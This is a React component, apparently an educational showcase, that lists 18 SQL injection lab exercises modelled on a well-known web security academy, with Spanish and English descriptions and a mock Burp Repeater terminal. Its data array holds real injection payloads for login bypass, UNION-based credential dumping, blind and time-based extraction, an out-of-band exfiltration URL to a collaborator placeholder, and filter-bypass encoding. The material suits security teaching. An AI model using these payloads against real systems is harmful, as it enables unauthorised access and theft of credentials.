import React, { useState } from 'react';
import { FaServer, FaTerminal, FaCode, FaCheckCircle, FaExclamationTriangle, FaBug } from 'react-icons/fa';
import { motion, AnimatePresence } from 'framer-motion';

const labsData = [
    { id: 1, title: "SQL injection vulnerability in WHERE clause allowing retrieval of hidden data", type: "In-band", level: "Apprentice", payload: "' OR 1=1--", description: "Bypassing a WHERE clause to extract hidden products from the database. Un filtro vulnerable en la categoría de productos." },
    { id: 2, title: "SQL injection vulnerability allowing login bypass", type: "In-band", level: "Apprentice", payload: "administrator'--", description: "Exploiting a login form to bypass authentication and access the admin account sin conocer la contraseña." },
    { id: 3, title: "SQL injection attack, querying the database type and version on Oracle", type: "UNION-based", level: "Apprentice", payload: "SELECT * FROM v$version", description: "Using UNION SELECT to fingerprint an Oracle database y entender la tecnología del backend." },
    { id: 4, title: "SQL injection attack, querying the database type and version on MySQL and Microsoft", type: "UNION-based", level: "Apprentice", payload: "SELECT @@version", description: "Fingerprinting MySQL/Microsoft SQL Server to determine the backend engine." },
    { id: 5, title: "SQL injection attack, listing the database contents on non-Oracle databases", type: "UNION-based", level: "Practitioner", payload: "SELECT table_name FROM information_schema.tables", description: "Extracting tables and columns from PostgreSQL, MySQL, and MSSQL. Acceso directo a los metadatos." },
    { id: 6, title: "SQL injection attack, listing the database contents on Oracle", type: "UNION-based", level: "Practitioner", payload: "SELECT table_name FROM all_tables", description: "Extracting tables and columns from an Oracle Database. Su arquitectura requiere consultas específicas." },
    { id: 7, title: "SQL injection UNION attack, determining the number of columns returned by the query", type: "UNION-based", level: "Apprentice", payload: "ORDER BY 3--", description: "Using ORDER BY or UNION SELECT with NULLs to find the correct column count. Paso fundamental para inyecciones UNION." },
    { id: 8, title: "SQL injection UNION attack, finding a column containing text", type: "UNION-based", level: "Apprentice", payload: "UNION SELECT NULL, 'abc', NULL--", description: "Identifying which columns are compatible with string data types para inyectar payloads de texto." },
    { id: 9, title: "SQL injection UNION attack, retrieving data from other tables", type: "UNION-based", level: "Apprentice", payload: "UNION SELECT username, password FROM users--", description: "Dumping usernames and passwords from another table via UNION. Extracción de credenciales de administrador." },
    { id: 10, title: "SQL injection UNION attack, retrieving multiple values in a single column", type: "UNION-based", level: "Practitioner", payload: "UNION SELECT username || '~' || password FROM users--", description: "Concatenating strings to fit multiple fields into a single vulnerable column cuando el espacio es limitado." },
    { id: 11, title: "Blind SQL injection with conditional responses", type: "Blind", level: "Practitioner", payload: "AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a'", description: "Inferring data by observing differences in application true/false responses. Inyección a ciegas sin errores visibles." },
    { id: 12, title: "Blind SQL injection with conditional errors", type: "Blind", level: "Practitioner", payload: "AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a'", description: "Forcing database errors based on boolean conditions to infer data. Provocando fallos matemáticos controlados." },
    { id: 13, title: "Visible error-based SQL injection", type: "Error-based", level: "Practitioner", payload: "CAST((SELECT password FROM users LIMIT 1) AS int)", description: "Extracting output directly from verbose database error messages. Abuso del casteo de tipos de datos." },
    { id: 14, title: "Blind SQL injection with time delays", type: "Blind (Time)", level: "Practitioner", payload: "|| (SELECT pg_sleep(10))--", description: "Using injected delays to infer vulnerability. Si la respuesta tarda 10 segundos, la inyección fue exitosa." },
    { id: 15, title: "Blind SQL injection with time delays and information retrieval", type: "Blind (Time)", level: "Practitioner", payload: "WAITFOR DELAY '0:0:10'", description: "Extracting data bit by bit using time delays as a side channel. El nivel más lento pero seguro de extracción." },
    { id: 16, title: "Blind SQL injection with out-of-band interaction", type: "OAST", level: "Practitioner", payload: "SELECT extractvalue(xmltype(...),'/l') FROM dual", description: "Triggering DNS lookups to an external server (Burp Collaborator) to confirm vulnerability out-of-band." },
    { id: 17, title: "Blind SQL injection with out-of-band data exfiltration", type: "OAST", level: "Practitioner", payload: "http://BURP-COLLABORATOR-PAYLOAD/?pwd=+", description: "Exfiltrating database contents via DNS queries hacia nuestro servidor controlado." },
    { id: 18, title: "SQL injection with filter bypass via XML encoding", type: "Filter Bypass", level: "Practitioner", payload: "&#x53;&#x45;&#x4c;&#x45;&#x43;&#x54;", description: "Bypassing Web Application Firewalls (WAF) using XML entity encoding. Evasión de filtros de seguridad." },
];

const SQLInjectionLabs = () => {
    const [activeLabId, setActiveLabId] = useState(1);
    const activeLab = labsData.find(lab => lab.id === activeLabId);

    return (
        <div className="flex flex-col lg:flex-row gap-6 bg-[#0a0f1a] rounded-xl border border-gray-800 shadow-2xl overflow-hidden min-h-[600px] font-sans">

            {/* Sidebar Navigation */}
            <div className="lg:w-1/3 bg-[#05080f] border-r border-gray-800 flex flex-col">
                <div className="p-4 border-b border-gray-800 bg-black/40">
                    <h3 className="text-green-500 font-mono font-bold tracking-widest text-sm flex items-center gap-2">
                        <FaServer /> PORTAL DE LABORATORIOS
                    </h3>
                    <p className="text-xs text-gray-500 mt-1">Selecciona un modelo de explotación para analizar su arquitectura e impacto correspondiente.</p>
                </div>

                <div className="flex-1 overflow-y-auto custom-scrollbar p-2 space-y-1 h-[400px] lg:h-auto">
                    {labsData.map((lab) => (
                        <button
                            key={lab.id}
                            onClick={() => setActiveLabId(lab.id)}
                            className={`w-full text-left p-3 rounded-lg transition-all duration-200 border ${activeLabId === lab.id
                                    ? 'bg-green-900/20 border-green-500/50 text-white shadow-[0_0_10px_rgba(34,197,94,0.1)]'
                                    : 'border-transparent text-gray-400 hover:bg-gray-800/50 hover:text-gray-200'
                                }`}
                        >
                            <div className="flex items-center justify-between mb-1">
                                <span className="font-mono text-xs font-bold w-6 h-6 rounded bg-black/50 border border-gray-700 flex items-center justify-center">
                                    {String(lab.id).padStart(2, '0')}
                                </span>
                                <span className={`text-[9px] px-2 py-0.5 rounded uppercase font-bold tracking-wider ${lab.level === 'Apprentice' ? 'bg-blue-500/20 text-blue-400' : 'bg-orange-500/20 text-orange-400'
                                    }`}>
                                    {lab.level}
                                </span>
                            </div>
                            <p className="text-xs truncate font-medium">{lab.type}</p>
                        </button>
                    ))}
                </div>
            </div>

            {/* Main Content Area */}
            <div className="lg:w-2/3 p-6 lg:p-10 relative flex flex-col">
                <AnimatePresence mode="wait">
                    <motion.div
                        key={activeLab.id}
                        initial={{ opacity: 0, x: 20 }}
                        animate={{ opacity: 1, x: 0 }}
                        exit={{ opacity: 0, x: -20 }}
                        transition={{ duration: 0.3 }}
                        className="flex-1 flex flex-col"
                    >
                        {/* Header */}
                        <div className="mb-6 pb-6 border-b border-gray-800">
                            <div className="flex items-center gap-3 mb-4">
                                <span className="bg-green-500/10 text-green-400 border border-green-500/30 px-3 py-1 text-xs font-mono rounded-full uppercase tracking-wider shadow-[0_0_10px_rgba(34,197,94,0.2)]">
                                    {activeLab.type}
                                </span>
                                <span className="bg-gray-800 text-gray-300 px-3 py-1 text-xs font-mono rounded-full">
                                    LAB #{String(activeLab.id).padStart(2, '0')}
                                </span>
                            </div>
                            <h2 className="text-xl lg:text-3xl font-bold text-white leading-tight mb-4">
                                {activeLab.title}
                            </h2>
                            <p className="text-gray-400 text-sm leading-relaxed border-l-4 border-gray-700 pl-4 bg-gray-900/30 py-2">
                                {activeLab.description}
                            </p>
                        </div>

                        {/* Visual Terminal / Output Mockup */}
                        <div className="flex-1 bg-black rounded-lg border border-gray-800 overflow-hidden flex flex-col font-mono text-xs shadow-2xl relative">
                            {/* Terminal Header */}
                            <div className="bg-gray-900 border-b border-gray-800 px-4 py-2 flex items-center gap-2">
                                <div className="w-3 h-3 rounded-full bg-red-500"></div>
                                <div className="w-3 h-3 rounded-full bg-yellow-500"></div>
                                <div className="w-3 h-3 rounded-full bg-green-500"></div>
                                <span className="ml-4 text-gray-500">burp-suite-proxy.exe / repeater</span>
                            </div>

                            {/* Terminal Body */}
                            <div className="p-4 text-gray-300 flex-1 space-y-4">
                                <div>
                                    <span className="text-blue-400">GET</span> <span className="text-yellow-400">/filter?category=Gifts</span> HTTP/1.1<br />
                                    <span className="text-blue-400">Host:</span> <span className="text-gray-400">vulnerable-website.com</span>
                                </div>

                                <div className="border-l-2 border-green-500 pl-4 py-2 bg-green-900/10">
                                    <div className="text-green-500 font-bold mb-2 flex items-center gap-2">
                                        <FaBug /> POISONED PAYLOAD DETECTED
                                    </div>
                                    <div className="bg-black border border-green-900 p-3 rounded text-green-400 break-all shadow-[0_0_15px_rgba(34,197,94,0.15)]">
                                        {/* Animated typing effect simulation */}
                                        <motion.span
                                            initial={{ opacity: 0 }}
                                            animate={{ opacity: 1 }}
                                            transition={{ duration: 1 }}
                                        >
                                            <span className="text-red-400 font-bold">INJECT &raquo; </span>
                                            {activeLab.payload}
                                        </motion.span>
                                    </div>
                                </div>

                                <div className="text-gray-500 mt-4">
                                    <span className="text-gray-400">HTTP/1.1</span> <span className="text-green-400 font-bold">200 OK</span><br />
                                    [... Datos Exfiltrados / Respuesta Alterada ...]
                                </div>
                            </div>

                            <div className="bg-green-900/30 text-green-400 px-4 py-2 border-t border-green-900/50 flex items-center justify-between text-[10px] uppercase font-bold tracking-widest">
                                <span className="flex items-center gap-2"><FaCheckCircle /> CONGRATULATIONS, YOU SOLVED THE LAB!</span>
                                <span>SUCCESS</span>
                            </div>
                        </div>

                    </motion.div>
                </AnimatePresence>
            </div>

        </div>
    );
};

export default SQLInjectionLabs;
